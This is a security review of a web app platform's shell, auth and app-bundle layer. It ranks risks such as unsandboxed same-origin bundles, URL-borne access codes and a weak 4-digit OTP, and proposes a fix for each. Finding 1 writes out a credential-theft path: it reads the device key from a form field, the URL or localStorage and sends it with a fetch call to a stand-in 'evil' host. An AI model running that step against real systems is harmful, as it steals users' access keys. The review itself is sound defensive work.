# Kody OS app-layer security review — 2026-10-27

Scope: `pkg/src/app.ts`, `auth.ts`, `apps/registry.ts`, `apps/client.ts`, `apps/forms.ts`, `apps/storage.ts`, `example-apps/*.json`. Read-only audit, no code changes.

## Trust model (as built)

- Shell + registry + auth are server-side, trusted.
- Bundles (`example-apps/*`, anything via `add_app`/`import_app`) are **fully trusted same-origin code**: entry HTML + JS/CSS inline into the shell origin with no sandbox, no iframe, no CSP. A malicious bundle can read `?k=`, hidden `k` fields, and `localStorage kody_os_auth` and exfiltrate via `fetch`.
- Therefore the real perimeter is **who can publish an app**: MCP `add_app`/`import_app` callers (owner + agent). There is no untrusted-author path today. Keep it that way until sandboxing exists.

## Findings (ranked)

### 1. Malicious/poisoned bundle = full takeover (HIGH, by design — document it)
- `renderBundleContent` inlines entry HTML + all `.js`/`.css` unsanitized into shell origin. Intentional (apps need script), but same origin means bundle JS inherits the device-code bearer.
- Steal paths: `document.querySelector('input[name=k]')`, `location.search`, `localStorage.getItem('kody_os_auth')`, then `fetch('https://evil/...?k='+code)`.
- SVG icons are NOT the same risk: `sanitizeSvgIcon` allowlists tags/attrs, rejects `on*`, `style`, `href/src`, `url()/javascript:/data:`, enforces mono fill/stroke. Good choke point — keep.
- Fixes:
  1. Document: "installing an app = running its code with your device key." Review gate before `import_app` from third parties.
  2. When ready: render bundles in a sandboxed `<iframe sandbox="allow-scripts">` on a separate origin, `postMessage` bridge for actions. Big change — openspec it, don't bolt on.
  3. Cheap now: add `Content-Security-Policy: frame-ancestors 'none'` + `X-Content-Type-Options: nosniff` to `pageHeaders()` so the OS itself can't be clickjacked; bundles inherit it.

### 2. State-changing GET + `?k=` bearer in URL (MEDIUM — Scribe forces it, contain it)
- Actions ride GET forms (Kody edge blocks cross-origin POST; Scribe has no cookies). `withAccessCodeInHtml` stamps `?k=` into every link on the query path. Already mitigated: `Referrer-Policy: no-referrer`, `Cache-Control: no-store`, PRG 303, `safeNextPath` allowlist (no open redirect — verified: rejects `//`, `://`, `\`, `\n`, off-prefix).
- Residual: code lives in browser history, proxy/gateway logs, shoulder-surfable bookmarks. Anyone with the link owns the OS until secret rotation.
- Fixes:
  1. Prefer cookie path wherever possible; keep `?k=` only as fallback (already the shape — don't regress it).
  2. Never persist the raw device code in `localStorage` (`gate-form` + `unlock` interstitial do today). Store the OTP-minted session bearer instead; device code stays bookmark-only.
  3. Consider expiry/labels for bookmark codes (rotation story exists: secret overwrite invalidates all — say so in docs).

### 3. OTP 4-digit + device-wide fail counter (MEDIUM-LOW)
- Strengths: `hashesMatch` is constant-time (length check leaks only fixed length — fine), SHA-256 via `subtle`, single-use burn, 10-min TTL, max 5 outstanding, fail window 10 tries/10 min.
- Weaknesses: 10k space at ~10 tries/10 min ≈ 1.4k/day → brute-forceable over ~a week of steady guessing; device-wide counter lets an attacker lock out the owner (DoS); no per-IP throttling.
- Fixes: 6-digit OTPs, burn on every failed attempt against that OTP, per-IP + per-OTP counters alongside the global one.
- Decision 2026-10-27: owner keeps 4 digits for now (usability over brute-force margin; single-use + 10-min TTL + 10/10min fail window accepted). Revisit if exposed to untrusted networks.

### 4. Missing hardening headers (LOW, cheap)
- `pageHeaders()` sends only `no-store` + `no-referrer`. Add: `X-Content-Type-Options: nosniff`, `frame-ancestors 'none'` (or `SAMEORIGIN` if embeds ever needed), `Cross-Origin-Opener-Policy: same-origin`.
- Full `script-src` CSP conflicts with inline bundle scripts — defer until the iframe sandbox (finding 1.2); don't half-apply and break apps.

### 5. Small hygiene notes (LOW)
- `transform` is allowlisted in SVG attrs: benign (rotate/translate only, no URL payloads — sanitizer already rejects `url(`/`javascript:`/`data:` values). Leave.
- `actFromForm` passes all non-`action` query keys as args; `act()` validates before mutation on a cloned state with single write (atomic — good). Confirm integer args coerce strictly (string `"3"` vs `3`) so GET forms can't smuggle types past `validateActionDef`.
- `safeNextPath`/`closeHref`/`from` handling verified closed (allowlist `/apps` → Apps, `/` → Home, else Home).
- Theme `gridBodyStyle` strictly validates 8×0–255 bytes, falls back to `desk`; theme icon reuses the SVG sanitizer; `escapeAttribute`/`escapeHtml` cover shell-rendered values. Good.

## What I did NOT find
- No open redirect (`safeNextPath` + `withAccessCode` both reject absolute/protocol-relative URLs).
- No stored XSS via icons, theme, titles, state fields, or error strings (all escaped/sanitized at the single choke points).
- No auth bypass: cookie → `?k=` → Kody-visitor (live `metaGetCurrentUser` confirm, fails closed) → locked honest-404. No empty-code-accepts path (`normalized !== ''` gates everywhere checked).

## Recommended next steps
1. Docs touch (30 min): trust warning in `adding-an-app.md` + rotation runbook.
2. Headers (15 min): `nosniff` + `frame-ancestors` in `pageHeaders()`.
3. `localStorage` bearer swap (1–2 h): session token instead of raw code.
4. OTP hardening (1 h): 6 digits + per-OTP burn + per-IP counter.
5. Sandbox epic (openspec, multi-day): iframe + `postMessage` action bridge; unblocks third-party apps.

No code changed in this review.
